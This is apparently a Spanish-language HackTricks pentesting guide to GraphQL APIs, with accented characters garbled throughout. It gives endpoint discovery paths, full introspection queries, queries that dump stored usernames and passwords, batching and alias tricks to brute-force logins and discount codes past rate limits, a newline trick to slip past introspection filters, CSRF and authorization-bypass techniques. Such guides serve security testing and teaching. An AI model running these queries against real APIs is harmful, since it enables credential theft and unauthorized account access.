# GraphQL

<details>

<summary><strong>Aprende a hackear AWS desde cero hasta convertirte en un experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

## Introducci칩n

GraphQL es **destacado** como una **alternativa eficiente** a las API REST, ofreciendo un enfoque simplificado para consultar datos desde el backend. A diferencia de REST, que a menudo requiere numerosas solicitudes en diferentes puntos finales para recopilar datos, GraphQL permite la obtenci칩n de toda la informaci칩n requerida a trav칠s de una **sola solicitud**. Esta optimizaci칩n beneficia significativamente a los desarrolladores al disminuir la complejidad de sus procesos de obtenci칩n de datos.

## GraphQL y Seguridad

Con la llegada de nuevas tecnolog칤as, incluido GraphQL, tambi칠n surgen nuevas vulnerabilidades de seguridad. Un punto clave a tener en cuenta es que **GraphQL no incluye mecanismos de autenticaci칩n de forma predeterminada**. Es responsabilidad de los desarrolladores implementar dichas medidas de seguridad. Sin una autenticaci칩n adecuada, los puntos finales de GraphQL pueden exponer informaci칩n sensible a usuarios no autenticados, lo que representa un riesgo de seguridad significativo.

### Ataques de Fuerza Bruta de Directorios y GraphQL

Para identificar instancias de GraphQL expuestas, se recomienda la inclusi칩n de rutas espec칤ficas en ataques de fuerza bruta de directorios. Estas rutas son:

* `/graphql`
* `/graphiql`
* `/graphql.php`
* `/graphql/console`
* `/api`
* `/api/graphql`
* `/graphql/api`
* `/graphql/graphql`

Identificar instancias de GraphQL abiertas permite examinar las consultas admitidas. Esto es crucial para comprender los datos accesibles a trav칠s del punto final. El sistema de introspecci칩n de GraphQL facilita esto al detallar las consultas que admite un esquema. Para obtener m치s informaci칩n al respecto, consulta la documentaci칩n de GraphQL sobre introspecci칩n: [**GraphQL: Un lenguaje de consulta para APIs.**](https://graphql.org/learn/introspection/)

### Fingerprint

La herramienta [**graphw00f**](https://github.com/dolevf/graphw00f) es capaz de detectar qu칠 motor de GraphQL se utiliza en un servidor y luego imprime informaci칩n 칰til para el auditor de seguridad.

#### Consultas universales <a href="#universal-queries" id="universal-queries"></a>

Para verificar si una URL es un servicio GraphQL, se puede enviar una **consulta universal**, `query{__typename}`. Si la respuesta incluye `{"data": {"__typename": "Query"}}`, confirma que la URL alberga un punto final de GraphQL. Este m칠todo se basa en el campo `__typename` de GraphQL, que revela el tipo del objeto consultado.
```javascript
query{__typename}
```
### Enumeraci칩n B치sica

GraphQL generalmente admite **GET**, **POST** (x-www-form-urlencoded) y **POST**(json). Aunque por seguridad se recomienda permitir solo json para prevenir ataques CSRF.

#### Introspecci칩n

Para utilizar la introspecci칩n y descubrir informaci칩n del esquema, consulta el campo `__schema`. Este campo est치 disponible en el tipo ra칤z de todas las consultas.
```bash
query={__schema{types{name,fields{name}}}}
```
Con esta consulta encontrar치s el nombre de todos los tipos que se est치n utilizando:

![](<../../.gitbook/assets/image (202).png>)

{% code overflow="wrap" %}
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
{% endcode %}

Con esta consulta puedes extraer todos los tipos, sus campos y sus argumentos (y el tipo de los argumentos). Esto ser치 muy 칰til para saber c칩mo consultar la base de datos.

![](<../../.gitbook/assets/image (207) (3).png>)

**Errores**

Es interesante saber si los **errores** se van a **mostrar**, ya que contribuir치n con **informaci칩n** 칰til.
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
**Enumerar el Esquema de la Base de Datos a trav칠s de la Introspecci칩n**

{% hint style="info" %}
Si la introspecci칩n est치 habilitada pero la consulta anterior no se ejecuta, intente eliminar las directivas `onOperation`, `onFragment` y `onField` de la estructura de la consulta.
{% endhint %}
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
Consulta de introspecci칩n en l칤nea:
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
La 칰ltima l칤nea de c칩digo es una consulta graphql que volcar치 toda la meta-informaci칩n de graphql (nombres de objetos, par치metros, tipos...)

![](<../../.gitbook/assets/image (206).png>)

Si la introspecci칩n est치 habilitada, puedes usar [**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager) para ver en una interfaz gr치fica todas las opciones.

### Consultando

Ahora que sabemos qu칠 tipo de informaci칩n est치 guardada en la base de datos, intentemos **extraer algunos valores**.

En la introspecci칩n puedes encontrar **qu칠 objeto puedes consultar directamente** (porque no puedes consultar un objeto solo porque existe). En la siguiente imagen puedes ver que el "_queryType_" se llama "_Query_" y que uno de los campos del objeto "_Query_" es "_flags_", que tambi칠n es un tipo de objeto. Por lo tanto, puedes consultar el objeto de la bandera.

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-17-48.png)

Ten en cuenta que el tipo de la consulta "_flags_" es "_Flags_", y este objeto est치 definido de la siguiente manera:

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-22-57.png)

Puedes ver que los objetos "_Flags_" est치n compuestos por **nombre** y **valor**. Luego puedes obtener todos los nombres y valores de las banderas con la consulta:
```javascript
query={flags{name, value}}
```
Ten en cuenta que en caso de que el **objeto a consultar** sea un **tipo primitivo** como **string** como en el siguiente ejemplo

![](<../../.gitbook/assets/image (441).png>) 

Simplemente puedes consultar con:
```javascript
query={hiddenFlags}
```
En otro ejemplo donde hab칤a 2 objetos dentro del objeto tipo "_Query_": "_user_" y "_users_".\
Si estos objetos no necesitan ning칰n argumento para buscar, se podr칤a **obtener toda la informaci칩n de ellos** simplemente **pidiendo** los datos que se desean. En este ejemplo de Internet se podr칤an extraer los nombres de usuario y contrase침as guardados:

![](<../../.gitbook/assets/image (208).png>)

Sin embargo, en este ejemplo, si intentas hacerlo, obtienes este **error**:

![](<../../.gitbook/assets/image (210).png>)

Parece que de alguna manera buscar치 usando el argumento "_**uid**_" de tipo _**Int**_.\
De todos modos, ya sab칤amos que, en la secci칩n de [Enumeraci칩n B치sica](graphql.md#basic-enumeration) se propuso una consulta que nos mostraba toda la informaci칩n necesaria: `query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

Si lees la imagen proporcionada cuando ejecuto esa consulta, ver치s que "_**user**_" ten칤a el **arg** "_**uid**_" de tipo _Int_.

Entonces, realizando un ligero ataque de fuerza bruta de _**uid**_ descubr칤 que en _**uid**=**1**_ se recuper칩 un nombre de usuario y una contrase침a:\
`query={user(uid:1){user,password}}`

![](<../../.gitbook/assets/image (211).png>)

Ten en cuenta que **descubr칤** que pod칤a solicitar los **par치metros** "_**user**_" y "_**password**_" porque si intento buscar algo que no existe (`query={user(uid:1){noExists}}`) obtengo este error:

![](<../../.gitbook/assets/image (213).png>)

Y durante la fase de **enumeraci칩n** descubr칤 que el objeto "_**dbuser**_" ten칤a como campos "_**user**_" y "_**password**_.

**Truco de volcado de cadena de consulta (gracias a @BinaryShadow\_)**

Si puedes buscar por un tipo de cadena, como: `query={theusers(description: ""){username,password}}` y **buscas una cadena vac칤a** se volcar치n todos los datos. (_Ten en cuenta que este ejemplo no est치 relacionado con el ejemplo de los tutoriales, para este ejemplo supongamos que puedes buscar usando "**theusers**" por un campo de tipo String llamado "**description**"_).

### B칰squeda

En esta configuraci칩n, una **base de datos** contiene **personas** y **pel칤culas**. Las **personas** se identifican por su **correo electr칩nico** y nombre; las **pel칤culas** por su nombre y **calificaci칩n**. Las **personas** pueden ser amigas entre s칤 y tambi칠n tener pel칤culas, lo que indica relaciones dentro de la base de datos.

Puedes **buscar** personas **por** el **nombre** y obtener sus correos electr칩nicos:
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
Puedes **buscar** personas **por** el **nombre** y obtener sus **pel칤culas** **suscritas**:
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
Tenga en cuenta c칩mo se indica recuperar el `name` de las `subscribedMovies` de la persona.

Tambi칠n se pueden **buscar varios objetos al mismo tiempo**. En este caso, se realiza una b칰squeda de 2 pel칤culas:
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
O incluso **relaciones de varios objetos diferentes usando alias**:
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### Mutaciones

**Las mutaciones se utilizan para realizar cambios en el lado del servidor.**

En la **introspecci칩n** puedes encontrar las **mutaciones** **declaradas**. En la siguiente imagen, el "_MutationType_" se llama "_Mutation_" y el objeto "_Mutation_" contiene los nombres de las mutaciones (como "_addPerson_" en este caso):

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-26-27.png)

En esta configuraci칩n, una **base de datos** contiene **personas** y **pel칤culas**. Las **personas** se identifican por su **correo electr칩nico** y **nombre**; las **pel칤culas** por su **nombre** y **calificaci칩n**. Las **personas** pueden ser amigas entre s칤 y tambi칠n tener pel칤culas, lo que indica relaciones dentro de la base de datos.

Una mutaci칩n para **crear nuevas** pel칤culas dentro de la base de datos puede ser como la siguiente (en este ejemplo, la mutaci칩n se llama `addMovie`):
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**Observa c칩mo tanto los valores como el tipo de datos est치n indicados en la consulta.**

Adem치s, la base de datos admite una operaci칩n de **mutaci칩n**, llamada `addPerson`, que permite la creaci칩n de **personas** junto con sus asociaciones a **amigos** y **pel칤culas** existentes. Es crucial tener en cuenta que los amigos y las pel칤culas deben existir previamente en la base de datos antes de vincularlos a la persona reci칠n creada.
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### Sobrecarga de directivas

Como se explica en [**uno de los fallos descritos en este informe**](https://www.landh.tech/blog/20240304-google-hack-50000/), una sobrecarga de directivas implica llamar a una directiva incluso millones de veces para hacer que el servidor pierda operaciones hasta que sea posible realizar un ataque de denegaci칩n de servicio (DoS).

### Fuerza bruta en lotes en 1 solicitud de API

Esta informaci칩n fue tomada de [https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/).\
Autenticaci칩n a trav칠s de la API de GraphQL con **el env칤o simult치neo de muchas consultas con diferentes credenciales** para verificarla. Es un ataque cl치sico de fuerza bruta, pero ahora es posible enviar m치s de un par de inicio de sesi칩n/contrase침a por solicitud HTTP debido a la funci칩n de lotes de GraphQL. Este enfoque enga침ar칤a a las aplicaciones externas de monitoreo de velocidad para que crean que todo est치 bien y que no hay un bot de fuerza bruta intentando adivinar contrase침as.

A continuaci칩n, puedes encontrar la demostraci칩n m치s simple de una solicitud de autenticaci칩n de aplicaci칩n, con **3 pares de correo electr칩nico/contrase침a diferentes a la vez**. Obviamente, es posible enviar miles en una sola solicitud de la misma manera:

![](<../../.gitbook/assets/image (182) (1).png>)

Como podemos ver en la captura de pantalla de la respuesta, las primeras y terceras solicitudes devolvieron _null_ y reflejaron la informaci칩n correspondiente en la secci칩n de _error_. La **segunda mutaci칩n ten칤a los datos de autenticaci칩n correctos** y la respuesta ten칤a el token de sesi칩n de autenticaci칩n correcto.

![](<../../.gitbook/assets/image (119) (1).png>)

## GraphQL Sin Introspecci칩n

Cada vez m치s **los puntos finales de GraphQL est치n deshabilitando la introspecci칩n**. Sin embargo, los errores que GraphQL arroja cuando recibe una solicitud inesperada son suficientes para que herramientas como [**clairvoyance**](https://github.com/nikitastupin/clairvoyance) puedan recrear la mayor parte del esquema.

Adem치s, la extensi칩n de Burp Suite [**GraphQuail**](https://github.com/forcesunseen/graphquail) **observa las solicitudes de API de GraphQL que pasan por Burp** y **construye** un esquema interno de GraphQL **con cada nueva consulta que ve**. Tambi칠n puede exponer el esquema para GraphiQL y Voyager. La extensi칩n devuelve una respuesta falsa cuando recibe una consulta de introspecci칩n. Como resultado, GraphQuail muestra todas las consultas, argumentos y campos disponibles para su uso dentro de la API. Para m치s informaci칩n, [**consultar aqu칤**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema).

Una **lista de palabras** 칰til para descubrir [**entidades de GraphQL se puede encontrar aqu칤**](https://github.com/Escape-Technologies/graphql-wordlist?).

### Eludir las defensas de introspecci칩n de GraphQL <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

### **Eludir las Defensas de Introspecci칩n de GraphQL**

Para eludir las restricciones en las consultas de introspecci칩n en las APIs, insertar un **car치cter especial despu칠s de la palabra clave `__schema`** resulta efectivo. Este m칠todo explota descuidos comunes de los desarrolladores en patrones de regex que buscan bloquear la introspecci칩n al enfocarse en la palabra clave `__schema`. Al agregar caracteres como **espacios, saltos de l칤nea y comas**, que GraphQL ignora pero que quiz치s no se tengan en cuenta en las regex, se pueden eludir las restricciones. Por ejemplo, una consulta de introspecci칩n con un salto de l칤nea despu칠s de `__schema` puede eludir tales defensas:
```bash
# Example with newline to bypass
{
"query": "query{__schema
{queryType{name}}}"
}
```
Si no tiene 칠xito, considere m칠todos de solicitud alternativos, como **solicitudes GET** o **POST con `x-www-form-urlencoded`**, ya que las restricciones pueden aplicarse solo a las solicitudes POST.

### **Descubriendo Estructuras GraphQL Expuestas**

Cuando la introspecci칩n est치 deshabilitada, examinar el c칩digo fuente del sitio web en busca de consultas precargadas en bibliotecas de JavaScript es una estrategia 칰til. Estas consultas se pueden encontrar utilizando la pesta침a `Sources` en las herramientas para desarrolladores, lo que proporciona informaci칩n sobre el esquema de la API y revela posibles **consultas sensibles expuestas**. Los comandos para buscar dentro de las herramientas para desarrolladores son:
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
## CSRF en GraphQL

Si no sabes qu칠 es CSRF, lee la siguiente p치gina:

{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
[csrf-cross-site-request-forgery.md](../../pentesting-web/csrf-cross-site-request-forgery.md)
{% endcontent-ref %}

En algunos casos, es posible encontrar varios puntos finales de GraphQL **configurados sin tokens CSRF.**

Ten en cuenta que las solicitudes de GraphQL suelen enviarse a trav칠s de solicitudes POST utilizando el Content-Type **`application/json`**.
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
Sin embargo, la mayor칤a de los puntos finales de GraphQL tambi칠n admiten **solicitudes POST** **`form-urlencoded`**:
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
Por lo tanto, dado que las solicitudes CSRF como las anteriores se env칤an **sin solicitudes de preflight**, es posible **realizar** **cambios** en el GraphQL abusando de un CSRF.

Sin embargo, ten en cuenta que el nuevo valor de cookie predeterminado de la bandera `samesite` de Chrome es `Lax`. Esto significa que la cookie solo se enviar치 desde un sitio web de terceros en solicitudes GET.

Ten en cuenta que generalmente es posible enviar la **solicitud** de **consulta** tambi칠n como una solicitud **GET y el token CSRF podr칤a no ser validado en una solicitud GET.**

Adem치s, abusando de un ataque [**XS-Search**](../../pentesting-web/xs-search.md) podr칤a ser posible exfiltrar contenido del punto final de GraphQL abusando de las credenciales del usuario.

Para obtener m치s informaci칩n, **consulta la** [**publicaci칩n original aqu칤**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html).

## Autorizaci칩n en GraphQL

Muchas funciones de GraphQL definidas en el punto final podr칤an verificar solo la autenticaci칩n del solicitante pero no la autorizaci칩n.

Modificar las variables de entrada de la consulta podr칤a llevar a la filtraci칩n de detalles de cuenta sensibles [filtrados](https://hackerone.com/reports/792927).

Incluso una mutaci칩n podr칤a llevar a la toma de posesi칩n de la cuenta al intentar modificar datos de otra cuenta.
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### Saltar la autorizaci칩n en GraphQL

[Encadenar consultas](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln) puede saltarse un sistema de autenticaci칩n d칠bil.

En el siguiente ejemplo, se puede ver que la operaci칩n es "forgotPassword" y que solo deber칤a ejecutar la consulta forgotPassword asociada. Esto se puede saltar agregando una consulta al final, en este caso agregamos "register" y una variable de usuario para que el sistema se registre como un nuevo usuario.

<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## Saltar los l칤mites de velocidad utilizando alias en GraphQL

En GraphQL, los alias son una caracter칤stica poderosa que permite **nombrar expl칤citamente propiedades** al hacer una solicitud de API. Esta capacidad es particularmente 칰til para recuperar **m칰ltiples instancias del mismo tipo** de objeto dentro de una sola solicitud. Los alias se pueden utilizar para superar la limitaci칩n que impide que los objetos GraphQL tengan m칰ltiples propiedades con el mismo nombre.

Para comprender detalladamente los alias en GraphQL, se recomienda el siguiente recurso: [Aliases](https://portswigger.net/web-security/graphql/what-is-graphql#aliases).

Si bien el prop칩sito principal de los alias es reducir la necesidad de numerosas llamadas a la API, se ha identificado un caso de uso no previsto donde los alias se pueden aprovechar para ejecutar ataques de fuerza bruta en un punto final de GraphQL. Esto es posible porque algunos puntos finales est치n protegidos por limitadores de velocidad dise침ados para evitar ataques de fuerza bruta restringiendo el **n칰mero de solicitudes HTTP**. Sin embargo, estos limitadores de velocidad pueden no tener en cuenta el n칰mero de operaciones dentro de cada solicitud. Dado que los alias permiten la inclusi칩n de m칰ltiples consultas en una sola solicitud HTTP, pueden eludir tales medidas de limitaci칩n de velocidad.

Considere el siguiente ejemplo que ilustra c칩mo las consultas con alias se pueden utilizar para verificar la validez de c칩digos de descuento de tienda. Este m칠todo podr칤a evitar los l칤mites de velocidad ya que recopila varias consultas en una sola solicitud HTTP, lo que potencialmente permite verificar numerosos c칩digos de descuento simult치neamente.
```bash
# Example of a request utilizing aliased queries to check for valid discount codes
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## Herramientas

### Esc치neres de vulnerabilidades

* [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): Kit que se puede utilizar para obtener esquemas y buscar datos sensibles, probar autorizaci칩n, forzar esquemas y encontrar rutas hacia un tipo dado.
* [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): Se puede utilizar de forma independiente o como [extensi칩n de Burp](https://github.com/doyensec/inql).
* [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): Se puede utilizar como cliente CLI tambi칠n para automatizar ataques.
* [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): Herramienta que lista las diferentes formas de llegar a un tipo dado en un esquema de GraphQL.
* [https://github.com/doyensec/inql](https://github.com/doyensec/inql): Extensi칩n de Burp para pruebas avanzadas de GraphQL. El _**Esc치ner**_ es el n칰cleo de InQL v5.0, donde puedes analizar un punto final de GraphQL o un archivo de esquema de introspecci칩n local. Genera autom치ticamente todas las consultas y mutaciones posibles, organiz치ndolas en una vista estructurada para su an치lisis. El componente _**Atacante**_ te permite ejecutar ataques de GraphQL por lotes, lo que puede ser 칰til para evadir l칤mites de velocidad implementados de manera deficiente.

### Clientes

* [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): Cliente GUI
* [https://altair.sirmuel.design/](https://altair.sirmuel.design/): Cliente GUI

### Pruebas autom치ticas

{% embed url="https://graphql-dashboard.herokuapp.com/" %}

* Video explicativo sobre AutoGraphQL: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## Referencias

* [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
* [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
* [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)

<details>

<summary><strong>Aprende a hackear AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** 춰Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
